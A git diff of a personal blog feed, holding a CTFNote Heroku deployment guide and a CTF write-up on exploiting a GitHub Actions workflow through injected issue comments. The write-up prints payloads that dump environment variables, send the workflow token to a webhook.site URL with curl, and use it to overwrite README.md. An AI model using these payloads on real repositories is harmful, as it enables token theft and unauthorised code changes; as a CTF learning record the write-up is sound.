+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_set_header&lt;/span&gt; X-Forwarded-Proto &lt;span class=&quot;token variable&quot;&gt;$scheme&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;add_header&lt;/span&gt; Pragma &lt;span class=&quot;token string&quot;&gt;&quot;no-cache&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;location&lt;/span&gt; /pad/&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_pass&lt;/span&gt;   http://&lt;span class=&quot;token variable&quot;&gt;$HEROKU_APP_PAD_URL/&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;/span&gt;        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_http_version&lt;/span&gt; 1.1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_set_header&lt;/span&gt; Host &lt;span class=&quot;token variable&quot;&gt;$http_host&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_set_header&lt;/span&gt; X-Real-IP &lt;span class=&quot;token variable&quot;&gt;$remote_addr&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_set_header&lt;/span&gt; X-Forwarded-For &lt;span class=&quot;token variable&quot;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_set_header&lt;/span&gt; X-Forwarded-Proto &lt;span class=&quot;token variable&quot;&gt;$scheme&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;add_header&lt;/span&gt; Pragma &lt;span class=&quot;token string&quot;&gt;&quot;no-cache&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;docker&quot;&gt;
+      &lt;pre class=&quot;language-docker&quot;&gt;&lt;code class=&quot;language-docker&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# front/Dockerfile&lt;/span&gt;
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; node:latest &lt;span class=&quot;token keyword&quot;&gt;AS&lt;/span&gt; build-deps&lt;/span&gt;
+
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; mkdir -p /usr/src/app&lt;/span&gt;
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;COPY&lt;/span&gt; package.json quasar.conf.js .postcssrc.js yarn.lock babel.config.js quasar.extensions.json /usr/src/app/&lt;/span&gt;
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; cd /usr/src/app &amp;amp;&amp;amp; yarn install&lt;/span&gt;
+
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;COPY&lt;/span&gt; src /usr/src/app/src&lt;/span&gt;
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;COPY&lt;/span&gt; public /usr/src/app/public&lt;/span&gt;
+
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;WORKDIR&lt;/span&gt; /usr/src/app&lt;/span&gt;
+
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; yarn build&lt;/span&gt;
+
+&lt;span class=&quot;token comment&quot;&gt;# _--------_&lt;/span&gt;
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; nginx:alpine&lt;/span&gt;
+
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; mkdir -p /logs&lt;/span&gt;
+
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;COPY&lt;/span&gt; &lt;span class=&quot;token options&quot;&gt;&lt;span class=&quot;token property&quot;&gt;--from&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;build-deps&lt;/span&gt;&lt;/span&gt; /usr/src/app/dist/spa /usr/share/nginx/html&lt;/span&gt;
+
+&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;COPY&lt;/span&gt; nginx.conf /etc/nginx/conf.d/default.conf&lt;/span&gt;
+
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;CMD&lt;/span&gt; /bin/sh -c &lt;span class=&quot;token string&quot;&gt;&quot;envsubst &apos;\$PORT \$HEROKU_APP_PAD_URL \$HEROKU_APP_BACKEND_URL&apos; &amp;lt; /etc/nginx/conf.d/default.conf &gt; /etc/nginx/conf.d/default.conf&quot;&lt;/span&gt; &amp;amp;&amp;amp; nginx -g &lt;span class=&quot;token string&quot;&gt;&apos;daemon off;&apos;&lt;/span&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Create a new app&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/heroku-new-app-a585d77992584841d556e9e4f3c398e5-a3f2b.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 209px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 58.85167464114832%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB/0lEQVQoz5VSy5LTMBD0/584ceLEB3DhC7hxBDbvkI3jR5z4Jcu2JNtK0rSU3SVFFUXhqq4Zj0Y9rZYCM1hoM/0Tw2ghhcFxX6M4tijSFjlxjiXRIDsI9P2IwDUbY+GI/wbXM9oLCSRkqSByiSJjXvXoGg1DopJrgmvBo0KlR/SE+gO9GqHZd0oaDOzLkwKLbyHW8wii6qDVgFZo1MULodvUdgZC9qgbQnQ+VoyvEG2PKCzwvMpIXCOLK6JGeih9vl+dUFckVJwopIJsNcbp4r0aR6d6xGRvL7himq6wzFU/eWhl0UkDySO3jE2jvIhgojcNlXWUnZ0F3n34hN3hiCQ9Yr3eYL5YYLneYh8leJrNcYgT7J73WK4WKCnkeoMf6PaLpkNwu93Q9ZrgFKr88vUJRUWDG95izuOczijKmtNb5rnPs+yENE2Rnip8/7H0e51tkrYEV0+oPOn/fmEYYzZbkvxEO6607kVh2yk+D96kGTDfhJxmoD00b1gR2q/1HGyMYdRQrFVlhe0uhJQtCWld+0A4jJMnff/xMza7CHUtsA8jbH/uEUYpzkWJDfNjkiKmohXz6BD7NWeFvVzvR3aESg9exeVy8UocuZs4Wfsbk/W1ceIjH+9wdVez1t5PQA5P6IrOw6qWKOuGlyKQl+ItPuYuvsL/E26PU+eG/QIYZZPgFsqmRwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Heroku New App&quot;
+        title=&quot;&quot;
+        src=&quot;/static/heroku-new-app-a585d77992584841d556e9e4f3c398e5-a3f2b.png&quot;
+        srcset=&quot;/static/heroku-new-app-a585d77992584841d556e9e4f3c398e5-d1337.png 200w,
+/static/heroku-new-app-a585d77992584841d556e9e4f3c398e5-a3f2b.png 209w&quot;
+        sizes=&quot;(max-width: 209px) 100vw, 209px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Set the config vars&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;HEROKU_APP_BACKEND_URL=&lt;code class=&quot;language-text&quot;&gt;&amp;lt;your-Backend-app-name&gt;.herokuapp.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;HEROKU_APP_PAD_URL=&lt;code class=&quot;language-text&quot;&gt;&amp;lt;your-Hedgedoc-app-name&gt;.herokuapp.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;PGSSLMODE=&lt;code class=&quot;language-text&quot;&gt;no-verify&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Deploy to Heroku using the Heroku CLI&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;
+      &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token assign-left variable&quot;&gt;imagename&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;ctfnote_front&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;appname&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;HEROKU_APPNAME&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+
+docker-compose up --build -d&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
+docker tag &lt;span class=&quot;token variable&quot;&gt;$imagename&lt;/span&gt; registry.heroku.com/&lt;span class=&quot;token variable&quot;&gt;$appname&lt;/span&gt;/web&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
+docker push registry.heroku.com/&lt;span class=&quot;token variable&quot;&gt;$appname&lt;/span&gt;/web&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
+heroku container:release web --app &lt;span class=&quot;token variable&quot;&gt;$appname&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
 &lt;h2&gt;Using it&lt;/h2&gt;
+&lt;p&gt;There we go, now that we deployed the application on Heroku, we can visit &lt;a href=&quot;&quot;&gt;https://&amp;#x3C;your-Frontend-app-name&gt;.herokuapp.com&lt;/a&gt; and create an admin account.&lt;/p&gt;
+&lt;p&gt;Note: &lt;em&gt;you might want to quickly register an admin account and turn off registration as soon as possible.&lt;/em&gt;&lt;/p&gt;
 &lt;img src=&quot;https://github.com/TFNS/CTFNote/raw/graphql/screenshots/tasks.png&quot; width=&quot;100%&quot; alt=&quot;CTFNote Tasks Page&quot;&gt;
 &lt;img src=&quot;https://github.com/TFNS/CTFNote/blob/main/screenshots/task.png?raw=true&quot; width=&quot;100%&quot; alt=&quot;CTFNote Task Page&quot;&gt;
 &lt;h2&gt;Acknowledgement&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&quot;https://github.com/TFNS/CTFNote/tree/main&quot;&gt;https://github.com/TFNS/CTFNote/tree/main&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Ricing my setup]]></title><description><![CDATA[NOT DONE Introduction The term “rice” is used to describe a person’s unix desktop where “ricing” is when someone is custom their desktop…]]></description><link>https://isnackable.me/dotfiles/</link><guid isPermaLink="false">https://isnackable.me/dotfiles/</guid><content:encoded>&lt;h1&gt;NOT DONE&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/TFNS/CTFNote/&quot;&gt;https://github.com/TFNS/CTFNote/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/52781529/nginx-heroku-docker-is-it-possible-to-run-nginx-as-a-reverse-proxy-on-heroku&quot;&gt;https://stackoverflow.com/questions/52781529/nginx-heroku-docker-is-it-possible-to-run-nginx-as-a-reverse-proxy-on-heroku&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Ricing my setup]]></title><description><![CDATA[NOT DONE Introduction The term “rice” is used to describe a person’s unix desktop where “ricing” is when someone is custom their desktop…]]></description><link>https://isnackable.me/dotfiles/</link><guid isPermaLink="false">https://isnackable.me/dotfiles/</guid><content:encoded>&lt;h1&gt;NOT DONE&lt;/h1&gt;
 &lt;h2&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;The term “rice” is used to describe a person’s unix desktop where “ricing” is when someone is custom their desktop such as the icons, panels, or system interface. When it comes to ricing a tiling window manager though, the ricing of a user’s system becomes much more involved. Basic things such as the panel bar and application launcher must be configured by the user.&lt;/p&gt;
 &lt;p&gt;The reddit community &lt;a href=&quot;https://www.reddit.com/r/unixporn&quot;&gt;/r/unixporn&lt;/a&gt; is a great place to stay up to date on what people are using for their setups.&lt;/p&gt;
@@ -119,7 +335,7 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
             return &quot;&quot;&lt;/span&gt;
           &lt;span class=&quot;token key atrule&quot;&gt;result-encoding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; string&lt;/code&gt;&lt;/pre&gt;
       &lt;/div&gt;
-&lt;p&gt;As it was my first time working with GitHub workflow, I needed to understand how GitHub workflow works. I googled the workflow syntax for github actions to understand the workflow configuration. &lt;/p&gt;
+&lt;p&gt;As it was my first time working with GitHub workflow, I needed to understand how GitHub workflow works. I googled the workflow syntax for github actions to understand the workflow configuration.&lt;/p&gt;
 &lt;p&gt;Link: &lt;a href=&quot;https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions&quot;&gt;https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;After reading the syntax, I realised this this workflow will the process describe in the workflow configuration when there is a new comment on an issue. With that knowledge, I figured that I should create a new issue and play around and see the logs on the workflow.&lt;/p&gt;
 &lt;p&gt;
@@ -158,7 +374,7 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
   
   &lt;/a&gt;
     &lt;/p&gt;
-&lt;p&gt;Then I proceed to make a new commnet under the newly created issue, “test issue”. I noticed that an action was ran after my comment, so I clicked on the action and tried to see the log.&lt;/p&gt;
+&lt;p&gt;Then I proceed to make a new comment under the newly created issue, “test issue”. I noticed that an action was ran after my comment, so I clicked on the action and tried to see the log.&lt;/p&gt;
 &lt;p&gt;
   &lt;a
     class=&quot;gatsby-resp-image-link&quot;
@@ -195,7 +411,7 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
   
   &lt;/a&gt;
     &lt;/p&gt;
-&lt;p&gt;So I realised that my comment is a user input that I can control, which may or may not be the vulnerability. As this is my only lead, I went ahead and googled more GitHub actions workflow releated stuff, and I came across a GitHub Security Lab blog post about untrusted input.&lt;/p&gt;
+&lt;p&gt;So I realised that my comment is a user input that I can control, which may or may not be the vulnerability. As this is my only lead, I went ahead and googled more GitHub actions workflow related stuff, and I came across a GitHub Security Lab blog post about untrusted input.&lt;/p&gt;
 &lt;p&gt;Link: &lt;a href=&quot;https://securitylab.github.com/research/github-actions-untrusted-input&quot;&gt;https://securitylab.github.com/research/github-actions-untrusted-input&lt;/a&gt;&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;
       &lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; comment_log
@@ -215,18 +431,18 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
 &lt;/span&gt;    return &quot;&quot;
     result-encoding: string&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
       &lt;/div&gt;
-&lt;p&gt;Looking at the workflow file again, I see that my input (&lt;em&gt;comment_body&lt;/em&gt;), is flows to &lt;code class=&quot;language-text&quot;&gt;console.log(process.env.COMMENT_BODY)&lt;/code&gt;. My first initial thought is that I could potential inject javascript code here. To test my theory, I tried inputing quotes, &lt;code class=&quot;language-text&quot;&gt;&apos;&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;&quot;&lt;/code&gt; to see if there is any error generated. &lt;/p&gt;
+&lt;p&gt;Looking at the workflow file again, I see that my input (&lt;em&gt;comment\&lt;/em&gt;body&lt;em&gt;), is flows to `console.log(process.env.COMMENT&lt;/em&gt;BODY)&lt;code class=&quot;language-text&quot;&gt;. My first initial thought is that I could potential inject javascript code here. To test my theory, I tried inputting quotes,&lt;/code&gt;’&lt;code class=&quot;language-text&quot;&gt;and&lt;/code&gt;”` to see if there is any error generated.&lt;/p&gt;
 &lt;p&gt;And did it work? Of course that didn’t work, it would have been too easy if it did. Afterwards, I thought to try out some of the steps written in the GitHub Security Lab blog post about untrusted input. I tried template injection, but that didn’t work as there is no template here.&lt;/p&gt;
-&lt;p&gt;Sadly, I was stuck here for a long time, just spamming and hoping for an error to pop out. I decided to continue googling GitHub actions/workflow, to see if I could find anything of interest. &lt;/p&gt;
+&lt;p&gt;Sadly, I was stuck here for a long time, just spamming and hoping for an error to pop out. I decided to continue googling GitHub actions/workflow, to see if I could find anything of interest.&lt;/p&gt;
 &lt;p&gt;Which somehow, I did. I found out that there is something called “workflow command”, not sure what that is, I read the website and noticed that a workflow command was passed in a &lt;code class=&quot;language-text&quot;&gt;console.log&lt;/code&gt;. I tried doing the same thing just to see what will happen.&lt;/p&gt;
 &lt;p&gt;Link: &lt;a href=&quot;https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions&quot;&gt;https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;My input: &lt;code class=&quot;language-text&quot;&gt;::save-state name=processID::12345&lt;/code&gt;. This workflow command create environment variables named STATE&lt;em&gt;processID with the value of 12345. I thought that this command could modify the COMMAND&lt;/em&gt;ID, so I replace “processID” with “COMMAND&lt;em&gt;ID”. Spoiler alert, it didn’t. Why not? That’s because this command created an enviroment variable and prepend “STATE&lt;/em&gt;“.&lt;/p&gt;
+&lt;p&gt;My input: &lt;code class=&quot;language-text&quot;&gt;::save-state name=processID::12345&lt;/code&gt;. This workflow command create environment variables named STATE_processID with the value of 12345. I thought that this command could modify the COMMENT_ID, so I replace “processID” with “COMMENT_ID”. Spoiler alert, it didn’t. Why not? That’s because this command created an environment variable and prepend “STATE_“.&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;
       &lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token key atrule&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; steps.comment_log.outputs.COMMENT_ID &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
       &lt;/div&gt;
-&lt;p&gt;Back to the workflow file again, I noticed that if I wanted the next step to run, the commet&lt;em&gt;log needed to output the COMMENT&lt;/em&gt;ID, right? Note: &lt;em&gt;Not really, &lt;code class=&quot;language-text&quot;&gt;steps.comment_log.outputs.COMMENT_ID&lt;/code&gt; is actually just the value of the output from the comment_log step.&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;With that, I’m going to skip my painstaking redundant effort to try to get “COMMNET&lt;em&gt;BODY” to be the value of “COMMENT&lt;/em&gt;ID”.&lt;/p&gt;
-&lt;p&gt;Now, another workflow command is &lt;code class=&quot;language-text&quot;&gt;::set-output name=action_fruit::strawberry&lt;/code&gt;. This workflow command set the value output of “action&lt;em&gt;fruit” to “strawberry”. Understanding this command, I tried to set the output value of commnet&lt;/em&gt;log, “COMMNET_ID” to “true” after learning that expression in the &lt;code class=&quot;language-text&quot;&gt;if&lt;/code&gt; statement will be evaluated as an expression. &lt;/p&gt;
+&lt;p&gt;Back to the workflow file again, I noticed that if I wanted the next step to run, the comment&lt;em&gt;log needed to output the COMMENT_ID, right? Note: _Not really, &lt;code class=&quot;language-text&quot;&gt;steps.comment_log.outputs.COMMENT_ID&lt;/code&gt; is actually just the value of the output from the comment_log step.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;With that, I’m going to skip my painstaking redundant effort to try to get “COMMENT_BODY” to be the value of “COMMENT_ID”.&lt;/p&gt;
+&lt;p&gt;Now, another workflow command is &lt;code class=&quot;language-text&quot;&gt;::set-output name=action_fruit::strawberry&lt;/code&gt;. This workflow command set the value output of “action_fruit” to “strawberry”. Understanding this command, I tried to set the output value of comment_log, “COMMENT_ID” to “true” after learning that expression in the &lt;code class=&quot;language-text&quot;&gt;if&lt;/code&gt; statement will be evaluated as an expression.&lt;/p&gt;
 &lt;p&gt;My input: &lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true&lt;/code&gt;. Finally, I started to see progress. Quickly, I know that command injection is possible, as this input is treated as an expression as part of the variable declaration.&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;
       &lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; id &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; steps&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;comment_log&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;outputs&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;COMMENT_ID&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
@@ -267,7 +483,7 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
   
   &lt;/a&gt;
     &lt;/p&gt;
-&lt;p&gt;Time to print out the enviroment variables, which contains the GITHUB TOKEN for READ/WRITE access according to the GitHub workflow documentation. My input: &lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;console.log(process.env);&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Time to print out the environment variables, which contains the GITHUB TOKEN for READ/WRITE access according to the GitHub workflow documentation. My input: &lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;console.log(process.env);&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;
   &lt;a
     class=&quot;gatsby-resp-image-link&quot;
@@ -305,10 +521,12 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
   &lt;/a&gt;
     &lt;/p&gt;
 &lt;p&gt;However, the GitHub token is masked, therefore we cannot just see it. Also, later on, I would realised the the token is only valid while the action is being run. Therefore, even if I could copy and token, it would be useless later.&lt;/p&gt;
-&lt;p&gt;I then used some website to recieve request, thinking that I could append the token as part of the URL, just to validate the token exists. My input: &lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;const execSync = require(&apos;child_process&apos;).execSync; code = execSync(&apos;curl https://webhook.site/REDACTED?token=&apos; + process.env[&quot;INPUT_GITHUB-TOKEN&quot;]);&lt;/code&gt;. I did the same for “ACTIONS&lt;em&gt;RUNTIME&lt;/em&gt;TOKEN”.&lt;/p&gt;
+&lt;p&gt;I then used some website to receive request, thinking that I could append the token as part of the URL, just to validate the token exists. My input: &lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;const execSync = require(&apos;child_process&apos;).execSync; code = execSync(&apos;curl https://webhook.site/REDACTED?token=&apos; + process.env[&quot;INPUT_GITHUB-TOKEN&quot;]);&lt;/code&gt;. I did the same for “ACTIONS_RUNTIME_TOKEN”.&lt;/p&gt;
 &lt;p&gt;After verifying that the token exists, all I had to do is to make a request using GitHub API with the token to commit to the “README.md” file. I spent quite a few time researching the API but the solution is below.&lt;/p&gt;
 &lt;h2&gt;My Solution&lt;/h2&gt;
-&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;const execSync = require(&apos;child_process&apos;).execSync; code = execSync(`curl -i --request PUT --url https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/contents/README.md --header &apos;authorization: Bearer ${process.env[&quot;INPUT_GITHUB-TOKEN&quot;]}&apos; --header &apos;content-type: application/json&apos; --data &apos;{ &quot;message&quot;: &quot;PWNED!!!!&quot;, &quot;content&quot;: &quot;V2UgYXJlIGluY3JlZGlibHkgc2VjdXJlISBCdXQgaWYgeW91IGRpc2FncmVlLCBwbGVhc2UgZmlsZSBhIFBSIDopCk5PUEUsIEkgRElTQUdSRUVFRSEh&quot;, &quot;sha&quot;: &quot;959c46eb0fbab9ab5b5bfb279ab6d70f720d1207&quot; }&apos; --fail`);&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;
+      &lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;set&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;output name&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;COMMENT_ID&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; execSync &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;child_process&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execSync&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; code &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;execSync&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;curl -i --request PUT --url https://api.github.com/repos/&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;process&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;env&lt;span class=&quot;token 